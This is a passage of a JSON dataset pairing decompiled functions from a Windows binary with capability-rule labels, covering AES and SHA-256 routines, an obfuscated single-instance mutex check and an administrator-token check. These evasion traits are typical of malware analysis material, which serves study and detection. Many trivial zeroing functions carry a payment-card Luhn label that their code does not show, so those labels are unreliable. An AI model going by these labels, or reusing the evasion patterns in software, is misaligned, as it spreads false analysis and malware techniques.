        "decompiled_code": "\nint32_t __cdecl\nfcn.0040dd50(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_ch != 0) {\n        iVar1 = fcn.0040a590(arg_8h + 8, arg_ch);\n        if (iVar1 != 0) goto code_r0x0040ddd0;\n    }\n    if (arg_10h != 0) {\n        iVar1 = fcn.0040a590(arg_8h + 0x2c, arg_10h);\n        if (iVar1 != 0) goto code_r0x0040ddd0;\n    }\n    if (arg_14h != 0) {\n        iVar1 = fcn.0040a590(arg_8h + 0x38, arg_14h);\n        if (iVar1 != 0) goto code_r0x0040ddd0;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.0040a590(arg_8h + 0x20, arg_18h);\n        if (iVar1 != 0) goto code_r0x0040ddd0;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.0040a590(arg_8h + 0x14, arg_1ch);\n        if (iVar1 != 0) {\ncode_r0x0040ddd0:\n            return iVar1 + -0x4080;\n        }\n    }\n    if (arg_ch != 0) {\n        uVar2 = fcn.0040ca50(arg_8h + 8);\n        *(arg_8h + 4) = uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 430
    },
    "0040de00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de00(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00401000(arg_8h, 0, 0xa4);\n    *(arg_8h + 0xa4) = arg_ch;\n    *(arg_8h + 0xa8) = arg_10h;\n    return;\n}\n",
        "token_count": 88
    },
    "0040e560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e560(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = *(arg_8h + 4);\n    iVar4 = arg_8h + 8;\n    uVar2 = fcn.0040ca50(iVar4);\n    if ((((uVar1 == uVar2) && (uVar1 < 0x401)) && (iVar3 = fcn.0040a470(iVar4, 0),  0 < iVar3)) &&\n       (iVar4 = fcn.0040ba70(iVar4, 0),  iVar4 != 0)) {\n        if (arg_ch != 0) {\n            iVar4 = fcn.0040a470(arg_8h + 0x2c, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.0040ba70(arg_8h + 0x2c, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.0040a470(arg_8h + 0x38, 0);\n            if (iVar4 < 1) {\n                return 0xffffbf80;\n            }\n            iVar4 = fcn.0040ba70(arg_8h + 0x38, 0);\n            if (iVar4 == 0) {\n                return 0xffffbf80;\n            }\n        }\n        iVar4 = fcn.0040a470(arg_8h + 0x14, 0);\n        if (0 < iVar4) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n            iVar4 = fcn.0040a470(arg_8h + 0x44, 0);\n            if (((0 < iVar4) && (iVar4 = fcn.0040a470(arg_8h + 0x50, 0),  0 < iVar4)) &&\n               (iVar4 = fcn.0040a470(arg_8h + 0x5c, 0),  0 < iVar4)) {\n                return 0;\n            }\n        }\n    }\n    return 0xffffbf80;\n}\n",
        "token_count": 534
    },
    "0040e7d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e7d0(uint *arg_8h)\n\n{\n    fcn.0040ff40(arg_8h + 1);\n    arg_8h[0x1c] = 0;\n    fcn.0040ef10(arg_8h + 0x1d, 400);\n    *arg_8h = 0;\n    return;\n}\n",
        "token_count": 88
    },
    "0040e940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e940(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    arg_8h[0x1c] = 0;\n    fcn.00401000(arg_8h + 0x1d, 0, 400);\n    *arg_8h = 0;\n    fcn.0040ff60(arg_8h + 1);\n    iVar1 = arg_8h[0x1c];\n    if (iVar1 < 0x14) {\n        arg_8h[iVar1 * 5 + 0x1d] = fcn.00410170;\n        arg_8h[iVar1 * 5 + 0x1e] = 0;\n        arg_8h[iVar1 * 5 + 0x20] = 0x20;\n        arg_8h[iVar1 * 5 + 0x21] = 1;\n        arg_8h[0x1c] = arg_8h[0x1c] + 1;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0040eba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040eba0(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    int32_t iVar10;\n    uint *arg_14h;\n    uint var_38h;\n    uint32_t auStack56 [7];\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint *var_8h;\n    uint *var_4h;\n    \n    arg_14h = &var_38h;\n    var_4h = arg_14h;\n    fcn.00401000(arg_14h, 0, 0x30);\n    iVar10 = 0;\n    var_8h = arg_8h + 8;\n    pcVar7 = arg_8h + 0xf;\ncode_r0x0040ebd3:\n    do {\n        *pcVar7 = *pcVar7 + '\\x01';\n        if (*pcVar7 == '\\0') {\n            pcVar7 = pcVar7 + -1;\n            if (0 < pcVar7 + (1 - arg_8h)) goto code_r0x0040ebd3;\n        }\n        iVar8 = fcn.00409050(arg_8h + 8, 1, arg_8h, arg_14h);\n        if (iVar8 != 0) goto code_r0x0040ec57;\n        iVar10 = iVar10 + 0x10;\n        arg_14h = var_4h + 4;\n        var_4h = arg_14h;\n        pcVar7 = arg_8h + 0xf;\n        if (0x2f < iVar10) {\n            iVar10 = 0;\n            do {\n                puVar9 = &var_38h + iVar10;\n                iVar8 = iVar10 + 0x10;\n                uVar2 = *(auStack56 + iVar10 + 4);\n                uVar3 = *(auStack56 + iVar10 + 8);\n                puVar1 = (arg_ch - &var_38h) + puVar9;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                *puVar9 = *puVar1 ^ *puVar9;\n                *(auStack56 + iVar10) = uVar4 ^ *(auStack56 + iVar10);\n                *(auStack56 + iVar10 + 4) = uVar5 ^ uVar2;\n                *(auStack56 + iVar10 + 8) = uVar6 ^ uVar3;\n                iVar10 = iVar8;\n            } while (iVar8 < 0x30);\n            iVar8 = fcn.004090c0(var_8h, &var_38h, 0x100);\n            if (iVar8 == 0) {\n                *arg_8h = var_18h;\n                arg_8h[1] = uStack24;\n                arg_8h[2] = uStack20;\n                arg_8h[3] = uStack16;\n            }\ncode_r0x0040ec57:\n            fcn.0040ef10(&var_38h, 0x30);\n            return iVar8;\n        }\n    } while( true );\n}\n",
        "token_count": 797
    },
    "0040ec70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ec70(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.00409080(arg_8h + 0x20);\n        fcn.0040ef10(arg_8h, 0x140);\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "0040eca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eca0(uint arg_8h)\n\n{\n    fcn.00401000(arg_8h, 0, 0x140);\n    return;\n}\n",
        "token_count": 42
    },
    "0040eea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eea0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    \n    _var_20h = ZEXT816(0);\n    _var_10h = ZEXT816(0);\n    fcn.004090a0(arg_8h + 0x20);\n    *(arg_8h + 0x138) = arg_ch;\n    *(arg_8h + 0x13c) = arg_10h;\n    *(arg_8h + 0x18) = 0x20;\n    *(arg_8h + 0x1c) = 10000;\n    iVar1 = fcn.004090c0(arg_8h + 0x20, &var_20h, 0x100);\n    if (iVar1 == 0) {\n        fcn.0040edb0(arg_8h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 260
    },
    "0040ef10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef10(uint arg_8h, uint arg_ch)\n\n{\n    (**0x4138e8)(arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 46
    },
    "0040ef30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ef30(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    fcn.0040bb10(&var_ch);\n    if (arg_14h != 0) {\n        iVar1 = fcn.0040cb40(&var_ch, arg_8h, 1);\n        if (iVar1 != 0) goto code_r0x0040efc6;\n        iVar1 = fcn.0040c360(arg_14h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x0040efc6;\n    }\n    if (arg_18h != 0) {\n        iVar1 = fcn.0040cb40(&var_ch, arg_ch, 1);\n        if (iVar1 != 0) goto code_r0x0040efc6;\n        iVar1 = fcn.0040c360(arg_18h, arg_10h, &var_ch);\n        if (iVar1 != 0) goto code_r0x0040efc6;\n    }\n    if (arg_1ch != 0) {\n        iVar1 = fcn.0040bb30(arg_1ch, arg_ch, arg_8h);\n    }\ncode_r0x0040efc6:\n    fcn.0040b400(&var_ch);\n    return iVar1;\n}\n",
        "token_count": 354
    },
    "0040ff40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff40(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.0040ef10(arg_8h, 0x6c);\n    }\n    return;\n}\n",
        "token_count": 57
    },
    "0040ff60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff60(uint arg_8h)\n\n{\n    fcn.00401000(arg_8h, 0, 0x6c);\n    return;\n}\n",
        "token_count": 43
    },
    "0040ff80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040ff80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_6ch;\n    \n    fcn.00401000(&var_6ch, 0, 0x6c);\n    iVar1 = fcn.0040fff0(&var_6ch, arg_14h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.004100c0(&var_6ch, arg_8h, arg_ch);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040fd80(&var_6ch, arg_10h);\n        }\n    }\n    fcn.0040ef10(&var_6ch, 0x6c);\n    return iVar1;\n}\n",
        "token_count": 192
    },
    "0040fff0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "hash data using SHA224",
            "hash data using SHA256"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fff0(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    bool bVar9;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar9 = arg_ch != 0;\n    *arg_8h = 0;\n    uVar6 = 0x1f83d9ab;\n    arg_8h[1] = 0;\n    uVar7 = 0x510e527f;\n    uVar1 = 0xbb67ae85;\n    if (bVar9) {\n        uVar1 = 0x367cd507;\n    }\n    uVar4 = 0xa54ff53a;\n    uVar2 = 0x3c6ef372;\n    if (bVar9) {\n        uVar2 = 0x3070dd17;\n    }\n    uVar5 = 0x5be0cd19;\n    if (bVar9) {\n        uVar6 = 0x64f98fa7;\n    }\n    uVar8 = 0x9b05688c;\n    if (bVar9) {\n        uVar8 = 0x68581511;\n        uVar7 = 0xffc00b31;\n        uVar5 = 0xbefa4fa4;\n    }\n    if (arg_ch != 0) {\n        uVar4 = 0xf70e5939;\n    }\n    uVar3 = 0x6a09e667;\n    if (arg_ch != 0) {\n        uVar3 = 0xc1059ed8;\n    }\n    arg_8h[2] = uVar3;\n    arg_8h[3] = uVar1;\n    arg_8h[4] = uVar2;\n    arg_8h[5] = uVar4;\n    arg_8h[6] = uVar7;\n    arg_8h[7] = uVar8;\n    arg_8h[8] = uVar6;\n    arg_8h[9] = uVar5;\n    arg_8h[0x1a] = arg_ch;\n    return 0;\n}\n",
        "token_count": 540
    },
    "00404e50": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00404e50(uchar (*arg_8h) [16], int32_t arg_ch, uchar (*arg_10h) [16], int32_t arg_14h, uchar (*arg_18h) [16])\n\n{\n    uchar (*pauVar1) [16];\n    int32_t iVar2;\n    uchar auVar3 [16];\n    \n    auVar3 = *arg_10h;\n    if (arg_ch != 0) {\n        iVar2 = (arg_ch - 1U >> 4) + 1;\n        pauVar1 = arg_18h;\n        do {\n            auVar3 = aesenc(auVar3 ^ *((arg_14h - arg_18h) + -0x10 + pauVar1[1]) ^ *arg_8h, arg_8h[1]);\n            auVar3 = aesenc(auVar3, arg_8h[2]);\n            auVar3 = aesenc(auVar3, arg_8h[3]);\n            auVar3 = aesenc(auVar3, arg_8h[4]);\n            auVar3 = aesenc(auVar3, arg_8h[5]);\n            auVar3 = aesenc(auVar3, arg_8h[6]);\n            auVar3 = aesenc(auVar3, arg_8h[7]);\n            auVar3 = aesenc(auVar3, arg_8h[8]);\n            auVar3 = aesenc(auVar3, arg_8h[9]);\n            auVar3 = aesenclast(auVar3, arg_8h[10]);\n            *pauVar1 = auVar3;\n            iVar2 = iVar2 + -1;\n            pauVar1 = pauVar1[1];\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 407
    },
    "00405d20": {
        "rules": [
            "delay execution",
            "contain obfuscated stackstrings",
            "check mutex",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405d20(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.KERNEL32.dll_Sleep)(500);\n    var_ch = 0x58314f58;\n    var_8h = 0x4f704441;\n    var_4h._0_2_ = 0x3130;\n    var_4h._2_1_ = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenMutexA)(0x1f0001, 0, &var_ch);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0, &var_ch);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0xffffffff);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 230
    },
    "00404b90": {
        "rules": [
            "encrypt data using AES via x86 extensions"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404dba)\n// WARNING: Removing unreachable block (ram,0x00404dae)\n// WARNING: Removing unreachable block (ram,0x00404d9b)\n// WARNING: Removing unreachable block (ram,0x00404d80)\n// WARNING: Removing unreachable block (ram,0x00404d74)\n// WARNING: Removing unreachable block (ram,0x00404d61)\n// WARNING: Removing unreachable block (ram,0x00404d46)\n// WARNING: Removing unreachable block (ram,0x00404d3a)\n// WARNING: Removing unreachable block (ram,0x00404d2a)\n// WARNING: Removing unreachable block (ram,0x00404d0f)\n// WARNING: Removing unreachable block (ram,0x00404d03)\n// WARNING: Removing unreachable block (ram,0x00404cf3)\n// WARNING: Removing unreachable block (ram,0x00404cd8)\n// WARNING: Removing unreachable block (ram,0x00404ccc)\n// WARNING: Removing unreachable block (ram,0x00404cbc)\n// WARNING: Removing unreachable block (ram,0x00404ca1)\n// WARNING: Removing unreachable block (ram,0x00404c95)\n// WARNING: Removing unreachable block (ram,0x00404c85)\n// WARNING: Removing unreachable block (ram,0x00404c6a)\n// WARNING: Removing unreachable block (ram,0x00404c5e)\n// WARNING: Removing unreachable block (ram,0x00404c4e)\n// WARNING: Removing unreachable block (ram,0x00404c33)\n// WARNING: Removing unreachable block (ram,0x00404c27)\n// WARNING: Removing unreachable block (ram,0x00404c17)\n// WARNING: Removing unreachable block (ram,0x00404bfc)\n// WARNING: Removing unreachable block (ram,0x00404bf0)\n// WARNING: Removing unreachable block (ram,0x00404be0)\n// WARNING: Removing unreachable block (ram,0x00404bc5)\n// WARNING: Removing unreachable block (ram,0x00404bb9)\n// WARNING: Removing unreachable block (ram,0x00404baa)\n\nvoid __cdecl fcn.00404b90(uchar (*arg_8h) [16], uchar (*arg_ch) [16])\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint uVar3;\n    \n    auVar2 = *arg_ch;\n    auVar1 = aeskeygenassist(auVar2, 1);\n    uVar3 = SUB164(auVar1 >> 0x60, 0);\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    *arg_8h = auVar2;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    auVar1 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 2);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[1] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 4);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[2] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 8);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[3] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x10);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[4] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x20);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[5] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x40);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[6] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x80);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[7] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x1b);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[8] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    auVar1 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n             ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aeskeygenassist(auVar1, 0x36);\n    uVar3 = SUB164(auVar2 >> 0x60, 0);\n    auVar2 = CONCAT88(SUB168(auVar1 >> 0x40, 0) << 0x20 | SUB168(auVar1, 0) >> 0x20, SUB168(auVar1, 0) << 0x20) ^ auVar1\n    ;\n    arg_8h[9] = auVar1;\n    auVar2 = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^ auVar2\n    ;\n    arg_8h[10] = CONCAT88(SUB168(auVar2 >> 0x40, 0) << 0x20 | SUB168(auVar2, 0) >> 0x20, SUB168(auVar2, 0) << 0x20) ^\n                 auVar2 ^ CONCAT412(uVar3, CONCAT48(uVar3, CONCAT44(uVar3, uVar3)));\n    auVar2 = aesimc(arg_8h[9]);\n    arg_8h[0xb] = auVar2;\n    auVar2 = aesimc(arg_8h[8]);\n    arg_8h[0xc] = auVar2;\n    auVar2 = aesimc(arg_8h[7]);\n    arg_8h[0xd] = auVar2;\n    auVar2 = aesimc(arg_8h[6]);\n    arg_8h[0xe] = auVar2;\n    auVar2 = aesimc(arg_8h[5]);\n    arg_8h[0xf] = auVar2;\n    auVar2 = aesimc(arg_8h[4]);\n    arg_8h[0x10] = auVar2;\n    auVar2 = aesimc(arg_8h[3]);\n    arg_8h[0x11] = auVar2;\n    auVar2 = aesimc(arg_8h[2]);\n    arg_8h[0x12] = auVar2;\n    auVar2 = aesimc(arg_8h[1]);\n    arg_8h[0x13] = auVar2;\n    return;\n}\n",
        "token_count": 3589
    },
    "00405bf0": {
        "rules": [
            "get token membership"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405bf0(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint SidToCheck;\n    int32_t TokenInformation;\n    int32_t TokenHandle;\n    uint ReturnLength;\n    int32_t IsMember;\n    \n    uVar5 = 0;\n    TokenHandle = 0;\n    TokenInformation = 0;\n    IsMember = 0;\n    ReturnLength = 0;\n    *arg_8h = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar2, 8, &TokenHandle);\n    if (iVar3 != 0) {\n        ReturnLength = 0x44;\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x1a, 0, &SidToCheck, &ReturnLength);\n        if ((iVar3 != 0) &&\n           (iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, &SidToCheck, &IsMember),  iVar3 != 0)) {\n            if (IsMember == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x13, &TokenInformation, 4, &ReturnLength);\n                if (iVar3 == 0) {\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (((uVar4 != 0x520) && (uVar4 != 0x522)) && (uVar5 = uVar4,  0 < uVar4)) {\n                        uVar5 = uVar4 & 0xffff | 0x80070000;\n                    }\n                    goto code_r0x00405ced;\n                }\n                iVar3 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(TokenInformation, &SidToCheck, &IsMember);\n                if (iVar3 == 0) goto code_r0x00405c35;\n                if (IsMember == 0) goto code_r0x00405ced;\n            }\n            *arg_8h = 1;\n            goto code_r0x00405ced;\n        }\n    }\ncode_r0x00405c35:\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (0 < uVar5) {\n        uVar5 = uVar5 & 0xffff | 0x80070000;\n    }\ncode_r0x00405ced:\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (TokenHandle != 0) {\n        (*pcVar1)(TokenHandle);\n    }\n    if (TokenInformation != 0) {\n        (*pcVar1)(TokenInformation);\n    }\n    return uVar5;\n}\n",
        "token_count": 679
    }
}